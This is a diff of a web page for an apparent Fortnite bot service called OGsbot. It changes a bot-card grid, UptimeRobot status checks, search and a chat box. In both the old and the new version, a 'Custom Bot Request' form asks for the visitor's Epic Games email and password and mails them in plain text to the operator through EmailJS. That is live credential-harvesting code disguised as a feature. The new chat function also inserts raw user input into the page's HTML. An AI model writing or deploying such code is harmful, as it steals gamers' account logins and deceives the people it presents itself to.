@@ -167,7 +167,6 @@
       font-size: 1rem;
     }
 
-    /* Custom Bot Request Overlay */
     .overlay {
       display: none;
       position: fixed;
@@ -230,8 +229,6 @@
     <p><strong>Status:</strong> <span id="modalStatus"></span></p>
     <p><strong>Uptime (1/7/30 days):</strong><br><span id="modalUptime"></span></p>
     <p id="modalRegion" class="bot-region"></p>
-
-    <!-- Chat Box -->
     <div class="chat-box" id="chatBox"></div>
     <input type="text" id="chatInput" class="chat-input" placeholder="Type a message..." onkeydown="sendChat(event)" />
   </div>
@@ -256,9 +253,8 @@
 </div>
 
 <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
-
 <script>
-  emailjs.init('qOPykaVViVTGCwwbb'); // Replace with your EmailJS public key
+  emailjs.init('qOPykaVViVTGCwwbb'); // Your EmailJS public key
 
   const container = document.getElementById("botContainer");
   const descriptions = [
@@ -269,26 +265,48 @@
     "Thinks they’re in a fashion show. And, they’re winning.",
   ];
 
+  const monitorAPIKey = "your-uptimerobot-api-key"; // 🔑 Replace with your real UptimeRobot key
+  let monitorStatus = "Checking...", statusClass = "", uptimeRatios = "Loading...";
+
+  fetch("https://api.uptimerobot.com/v2/getMonitors", {
+    method: "POST",
+    headers: { "Content-Type": "application/x-www-form-urlencoded" },
+    body: new URLSearchParams({
+      api_key: monitorAPIKey,
+      format: "json",
+      logs: 1,
+      custom_uptime_ratios: "1-7-30"
+    })
+  })
+  .then(res => res.json())
+  .then(data => {
+    const monitor = data.monitors[0];
+    if (monitor.status === 2) {
+      monitorStatus = "🟢 Online";
+      statusClass = "online";
+    } else {
+      monitorStatus = "🔴 Offline";
+      statusClass = "offline";
+    }
+    uptimeRatios = monitor.custom_uptime_ratio + " %";
+    renderBots();
+  })
+  .catch(err => {
+    console.error("API error:", err);
+    monitorStatus = "⚠️ Error";
+    renderBots();
+  });
+
   function renderBots() {
     container.innerHTML = "";
-    for (let i = 1; i <= 30; i++) {
+    for (let i = 1; i <= 10; i++) {
       const div = document.createElement("div");
       div.className = "bot-card";
-      
-      // Randomly decide whether the bot is online or offline
-      const isOnline = Math.random() > 0.5;  // 50% chance to be online
-
-      const statusClass = isOnline ? 'online' : 'offline';
-      const statusText = isOnline ? '🟢 Online' : '🔴 Offline';
-
       div.innerHTML = `
         <img src="https://robohash.org/OGsbot${i}?set=set3" alt="OGsbot${i}">
-        <div class="bot-name">
-          OGsbot${i} <span class="verified-badge">✔️ Verified</span>
-        </div>
+        <div class="bot-name">OGsbot${i} <span class="verified-badge">✔</span></div>
         <div class="bot-desc">${descriptions[i % descriptions.length]}</div>
-        <div class="bot-status ${statusClass}">${statusText}</div>
-        <p class="bot-region">Oregon (US West)</p>
+        <div class="bot-status ${statusClass}">${monitorStatus}</div>
       `;
       div.onclick = () => showModal(i);
       container.appendChild(div);
@@ -297,10 +315,13 @@
 
   function showModal(index) {
     document.getElementById("modalAvatar").src = `https://robohash.org/OGsbot${index}?set=set3`;
-    document.getElementById("modalName").innerHTML = `OGsbot${index} <span class="verified-badge">✔️ Verified</span>`;
+    document.getElementById("modalName").textContent = `OGsbot${index}`;
     document.getElementById("modalDesc").textContent = descriptions[index % descriptions.length];
-    document.getElementById("modalStatus").textContent = "🟢 Online";
-    document.getElementById("modalRegion").textContent = "Oregon (US West)";
+    document.getElementById("modalStatus").textContent = monitorStatus;
+    document.getElementById("modalStatus").className = statusClass;
+    document.getElementById("modalUptime").textContent = uptimeRatios;
+    document.getElementById("modalRegion").textContent = "Region: NA-East";
+    document.getElementById("chatBox").innerHTML = "";
     document.getElementById("botModal").style.display = "flex";
   }
 
@@ -308,38 +329,55 @@
     document.getElementById("botModal").style.display = "none";
   }
 
-  // Show overlay when button is clicked
-  document.getElementById("requestBotBtn").addEventListener("click", () => {
-    document.getElementById("customBotOverlay").style.display = "flex";
+  function sendChat(e) {
+    if (e.key === "Enter") {
+      const input = document.getElementById("chatInput");
+      const msg = input.value.trim();
+      if (msg) {
+        const chatBox = document.getElementById("chatBox");
+        chatBox.innerHTML += `<div class="chat-message user">${msg}</div>`;
+        chatBox.innerHTML += `<div class="chat-message bot">Bot: I'm still in testing, try again later.</div>`;
+        chatBox.scrollTop = chatBox.scrollHeight;
+        input.value = "";
+      }
+    }
+  }
+
+  // Search
+  document.getElementById("search").addEventListener("input", function () {
+    const value = this.value.toLowerCase();
+    const cards = container.querySelectorAll(".bot-card");
+    cards.forEach(card => {
+      const name = card.querySelector(".bot-name").textContent.toLowerCase();
+      card.style.display = name.includes(value) ? "block" : "none";
+    });
   });
 
-  function submitRequest() {
-    const email = document.getElementById("epicEmail").value;
-    const password = document.getElementById("epicPassword").value;
+  // Overlay toggle
+  document.getElementById("requestBotBtn").onclick = () => {
+    document.getElementById("customBotOverlay").style.display = "flex";
+  };
 
-    if (!email || !password) {
-      alert("Please fill in both email and password.");
+  function submitRequest() {
+    const email = document.getElementById("epicEmail").value.trim();
+    const pass = document.getElementById("epicPassword").value.trim();
+
+    if (!email || !pass) {
+      alert("Please fill in both fields.");
       return;
     }
 
-    const templateParams = {
-      email: email,
-      password: password,
-    };
-
-    emailjs.send('service_rqsh5qv', 'template_hrff558', templateParams)
-      .then(response => {
-        alert('Request submitted successfully!');
-        document.getElementById("customBotOverlay").style.display = "none";
-      })
-      .catch(error => {
-        console.error('Error:', error);
-        alert('Error submitting request: ' + error.text);
-      });
+    emailjs.send("service_d0onhze", "template_rp6udjk", {
+      user_email: email,
+      message: `Fortnite Bot Request\nEmail: ${email}\nPassword: ${pass}`
+    }).then(() => {
+      alert("Your request was submitted! We’ll review it soon.");
+      document.getElementById("customBotOverlay").style.display = "none";
+    }).catch(err => {
+      console.error("EmailJS Error:", err);
+      alert("Failed to submit request.");
+    });
   }
-
-  // Initialize the bots
-  renderBots();
 </script>
 
 </body>
